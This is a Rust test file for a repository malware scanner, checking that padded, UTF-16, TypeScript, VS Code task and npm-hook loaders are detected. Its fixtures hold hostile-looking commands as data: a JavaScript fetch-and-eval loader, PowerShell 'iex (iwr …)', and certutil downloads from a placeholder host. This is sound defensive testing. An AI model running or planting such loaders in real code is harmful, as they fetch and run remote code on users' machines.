//! The loader rules need a whole file, so a text file past the buffered size is
//! read into memory for them: padding a loader with comments to 5 MiB must not
//! hide it, and must not make the scan inconclusive. Cases generated here; the
//! fixture folder holds the rest.

use std::fs;

use repo_sniff_core::{Limits, Report, Severity, builtin_rules, scan};

const LOADER: &str = "const axios = require('axios');\n\
                      axios.get('https://payload.example.invalid/x').then((r) => eval(r.data));\n";

fn scan_files(files: &[(&str, Vec<u8>)], limits: Limits) -> Report {
    let dir = tempfile::tempdir().unwrap();
    for (name, contents) in files {
        let path = dir.path().join(name);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, contents).unwrap();
    }
    scan(dir.path(), &builtin_rules().unwrap(), limits)
}

fn rows(report: &Report, rule: &str) -> Vec<(String, usize, Severity)> {
    report
        .findings
        .iter()
        .filter(|f| f.rule_id == rule)
        .map(|f| (f.file.to_string_lossy().into_owned(), f.line, f.severity))
        .collect()
}

#[test]
fn a_loader_padded_past_the_buffered_size_is_still_found_and_the_scan_is_complete() {
    let padding = "// padding\n".repeat(1000);
    let text = format!("{padding}{LOADER}");
    let limits = Limits {
        max_buffered_size: 1024,
        ..Limits::default()
    };

    let report = scan_files(&[("big.js", text.into_bytes())], limits);

    assert_eq!(
        rows(&report, "run.js-fetch-eval"),
        [("big.js".to_string(), 1002, Severity::Critical)]
    );
    assert!(report.is_complete(), "{:?}", report.skipped);
}

#[test]
fn a_streamed_file_and_one_read_whole_agree() {
    let whole = scan_files(&[("a.js", LOADER.as_bytes().to_vec())], Limits::default());
    let streamed = scan_files(
        &[("a.js", LOADER.as_bytes().to_vec())],
        Limits {
            max_buffered_size: 8,
            ..Limits::default()
        },
    );

    assert_eq!(
        rows(&whole, "run.js-fetch-eval"),
        rows(&streamed, "run.js-fetch-eval")
    );
    assert_eq!(rows(&whole, "run.js-fetch-eval").len(), 1);
}

#[test]
fn a_loader_in_a_typescript_or_module_file_is_found_too() {
    let files: Vec<(&str, Vec<u8>)> = ["a.ts", "b.mjs", "c.cjs", "d.tsx", "e.jsx", "f.mts"]
        .iter()
        .map(|name| (*name, LOADER.as_bytes().to_vec()))
        .collect();

    let report = scan_files(&files, Limits::default());

    assert_eq!(rows(&report, "run.js-fetch-eval").len(), 6);
}

#[test]
fn other_files_are_not_read_as_javascript() {
    let report = scan_files(
        &[
            ("notes.md", LOADER.as_bytes().to_vec()),
            ("a.py", LOADER.as_bytes().to_vec()),
        ],
        Limits::default(),
    );

    assert!(rows(&report, "run.js-fetch-eval").is_empty());
}

fn windows_rows(report: &Report) -> Vec<(String, usize, Severity)> {
    report
        .findings
        .iter()
        .filter(|f| {
            matches!(
                f.rule_id.as_str(),
                "run.windows-remote-code"
                    | "obfuscation.windows-encoded-payload"
                    | "run.windows-defender-exclusion"
            )
        })
        .map(|f| (f.file.to_string_lossy().into_owned(), f.line, f.severity))
        .collect()
}

#[test]
fn a_utf16_powershell_script_is_read_after_decoding() {
    let text = "iex (iwr https://payload.example.invalid/a)\r\n";
    let mut bytes = vec![0xFF, 0xFE];
    for unit in text.encode_utf16() {
        bytes.extend_from_slice(&unit.to_le_bytes());
    }

    let report = scan_files(&[("setup.ps1", bytes)], Limits::default());

    assert_eq!(
        windows_rows(&report),
        [("setup.ps1".to_string(), 1, Severity::Critical)]
    );
}

#[test]
fn a_windows_loader_padded_past_the_buffered_size_is_still_found() {
    let padding = "rem padding\r\n".repeat(500);
    let text = format!("{padding}certutil -urlcache -f https://payload.example.invalid/a a\r\n");
    let limits = Limits {
        max_buffered_size: 1024,
        ..Limits::default()
    };

    let report = scan_files(&[("dropper.bat", text.into_bytes())], limits);

    assert_eq!(
        windows_rows(&report),
        [("dropper.bat".to_string(), 501, Severity::Critical)]
    );
    assert!(report.is_complete(), "{:?}", report.skipped);
}

#[test]
fn a_vscode_task_that_is_not_autorun_is_still_read() {
    let tasks = br#"{"tasks": [{"label": "x", "type": "shell", "command": "certutil",
        "args": ["-urlcache", "-f", "https://payload.example.invalid/a", "a.exe"]}]}"#;

    let report = scan_files(&[(".vscode/tasks.json", tasks.to_vec())], Limits::default());

    assert_eq!(
        windows_rows(&report),
        [(".vscode/tasks.json".to_string(), 1, Severity::Critical)]
    );
}

#[test]
fn only_the_scripts_of_a_package_json_are_read() {
    let manifest = br#"{"description": "certutil -urlcache -f https://payload.example.invalid/a a",
        "scripts": {"fetch": "certutil -urlcache -f https://payload.example.invalid/a a"}}"#;

    let report = scan_files(&[("package.json", manifest.to_vec())], Limits::default());

    assert_eq!(
        windows_rows(&report),
        [("package.json".to_string(), 2, Severity::Critical)]
    );
}

fn rule_level(report: &Report, rule: &str, file: &str) -> Option<Severity> {
    report
        .findings
        .iter()
        .find(|f| f.rule_id == rule && f.file.to_string_lossy() == file)
        .map(|f| f.severity)
}

#[test]
fn a_hook_that_runs_a_loader_is_as_bad_as_the_loader() {
    let manifest = br#"{"scripts": {"postinstall": "node setup.js"}}"#.to_vec();
    let report = scan_files(
        &[
            ("package.json", manifest),
            ("setup.js", LOADER.as_bytes().to_vec()),
        ],
        Limits::default(),
    );

    assert_eq!(
        rule_level(&report, "deps.npm-lifecycle-hook", "package.json"),
        Some(Severity::Critical)
    );
    let hook = report
        .findings
        .iter()
        .find(|f| f.rule_id == "deps.npm-lifecycle-hook")
        .unwrap();
    assert!(
        hook.explanation.contains("setup.js"),
        "{}",
        hook.explanation
    );
}

#[test]
fn a_minified_file_that_a_hook_starts_is_not_info_and_the_hook_follows_it() {
    let manifest = br#"{"scripts": {"postinstall": "node dist/setup.js"}}"#.to_vec();
    let minified = "function f(a){if(a>1){return a-1;}return a+1;}".repeat(60);
    let report = scan_files(
        &[
            ("package.json", manifest),
            ("dist/setup.js", format!("{minified}\n").into_bytes()),
        ],
        Limits::default(),
    );

    // The file is started by the script, so the minified line is HIGH, not
    // INFO: a tool runs it. The hook follows it.
    assert_eq!(
        rule_level(&report, "obfuscation.minified-source", "dist/setup.js"),
        Some(Severity::High)
    );
    assert_eq!(
        rule_level(&report, "deps.npm-lifecycle-hook", "package.json"),
        Some(Severity::High)
    );
}

#[test]
fn a_pack_hook_is_raised_one_level_less() {
    let manifest = br#"{"scripts": {"prepack": "node setup.js"}}"#.to_vec();
    let report = scan_files(
        &[
            ("package.json", manifest),
            ("setup.js", LOADER.as_bytes().to_vec()),
        ],
        Limits::default(),
    );

    // npm runs a prepack hook on pack and publish, not on install.
    assert_eq!(
        rule_level(&report, "deps.npm-lifecycle-hook", "package.json"),
        Some(Severity::High)
    );
}
